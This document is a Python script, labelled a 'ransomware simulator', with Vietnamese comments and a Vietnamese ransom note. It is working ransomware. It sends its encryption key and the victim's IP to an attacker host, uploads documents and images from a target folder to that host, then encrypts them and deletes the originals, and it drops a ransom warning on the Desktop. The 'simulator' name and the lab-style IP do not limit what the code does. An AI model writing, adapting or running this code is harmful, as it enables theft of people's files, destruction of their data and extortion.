import os
import socket
import json
from cryptography.fernet import Fernet


class RansomwareSimulator:
    def __init__(self, directory, server_host, server_port, file_extensions):
        self.directory = directory
        self.server_host = server_host
        self.server_port = server_port
        self.file_extensions = file_extensions
        self.key = Fernet.generate_key()
        self.victim_ip = self.get_local_ip()
        self.send_key_and_ip_to_server()

    def get_local_ip(self):
        """Lấy địa chỉ IP của máy nạn nhân"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))  # Kết nối tới Google DNS để xác định IP
            ip_address = s.getsockname()[0]
            s.close()
            return ip_address
        except Exception as e:
            print(f"[❌] Error getting local IP: {e}")
            return "UNKNOWN_IP"

    def send_key_and_ip_to_server(self):
        """Gửi mã khóa riêng và địa chỉ IP về server"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(10)
                print(f"Connecting to {self.server_host}:{self.server_port}...")
                s.connect((self.server_host, self.server_port))
                message = {
                    'type': 'key_info',
                    'ip_address': self.victim_ip,
                    'encryption_key': self.key.decode()
                }
                s.sendall(json.dumps(message).encode('utf-8'))
                print(f"[✔] Sent encryption key and victim IP: {self.victim_ip}")
        except Exception as e:
            print(f"[❌] Error sending encryption key and IP: {e}")

    def send_file_to_server(self, file_path):
        """Gửi file về server, lưu trữ trong thư mục có tên là địa chỉ IP của nạn nhân"""
        try:
            with open(file_path, 'rb') as file:
                file_data = file.read()

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(10)  
                s.connect((self.server_host, self.server_port))
                message = {
                    'type': 'file',
                    'ip_address': self.victim_ip,
                    'filename': os.path.basename(file_path),
                    'content': file_data.decode('latin1', errors='ignore')
                }
                s.sendall(json.dumps(message).encode('latin1'))
                print(f"[✔] Sent file: {file_path}")
        except Exception as e:
            print(f"[❌] Error sending file {file_path}: {e}")

    def find_and_encrypt_files(self):
        """Tìm và mã hóa các file trong thư mục mục tiêu"""
        print("Scanning directory for files...")
        for root, _, files in os.walk(self.directory):
            for file in files:
                if any(file.endswith(ext) for ext in self.file_extensions):
                    file_path = os.path.join(root, file)
                    self.send_file_to_server(file_path)
                    self.encrypt_file(file_path)

    def encrypt_file(self, file_path):
        """Mã hóa file và xóa file gốc"""
        fernet = Fernet(self.key)
        try:
            with open(file_path, 'rb') as file:
                original = file.read()
            encrypted = fernet.encrypt(original)

            encrypted_file_path = file_path + ".encrypted"
            with open(encrypted_file_path, 'wb') as encrypted_file:
                encrypted_file.write(encrypted)

            os.remove(file_path)
            print(f"[✔] File encrypted: {encrypted_file_path}")
        except Exception as e:
            print(f"[❌] Error encrypting file {file_path}: {e}")

    def create_ransomware_message(self):
        """Tạo file cảnh báo trên Desktop"""
        message = f"""
        Máy tính của bạn đã bị Ransomware.
        Tất cả các file quan trọng đã bị mã hóa.
        Để lấy lại dữ liệu, hãy liên hệ với chúng tôi.

        Địa chỉ IP của bạn: {self.victim_ip}
        """
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        message_file = os.path.join(desktop_path, "RANSOMWARE_WARNING.txt")

        try:
            with open(message_file, 'w', encoding='utf-8') as file:
                file.write(message)
            print(f"[✔] Ransomware warning created at: {message_file}")
        except Exception as e:
            print(f"[❌] Error creating ransomware message: {e}")


if __name__ == "__main__":
    # Cấu hình mục tiêu
    file_extensions = ['.txt', '.docx', '.jpg', '.jpeg', '.pdf', '.png']
    directory = '/home/ubuntu/Downloads'  # Thay bằng thư mục mục tiêu
    server_host = '10.20.20.1'  # IP của máy tấn công
    server_port = 12345  # Port của máy tấn công

    simulator = RansomwareSimulator(directory, server_host, server_port, file_extensions)

    # Kích hoạt ransomware
    print("Creating ransomware warning...")
    simulator.create_ransomware_message()
    print("Finding and encrypting files...")
    simulator.find_and_encrypt_files()
    print("Operation complete.")
